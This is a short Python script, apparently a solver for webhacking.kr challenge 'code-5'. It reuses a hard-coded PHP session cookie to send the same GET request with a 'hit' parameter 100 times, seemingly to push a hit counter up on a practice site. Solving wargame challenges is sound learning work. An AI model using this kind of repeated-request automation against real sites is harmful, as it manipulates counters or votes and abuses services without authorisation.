import requests

url="https://webhacking.kr/challenge/code-5/"
cookies={'PHPSESSID':"sq8r9qlmce81a9md6c3l8uq6j0"}

def sendPacket(repeat):

    for i in range(1, repeat+1):
        print("[+] Start {}th Sending. ".format(i))
        params = "?hit=justv95"
        find_url=url+params
        response=requests.get(find_url, cookies=cookies)

if __name__=='__main__':
    sendPacket(100)
    print("[!] Program exit.")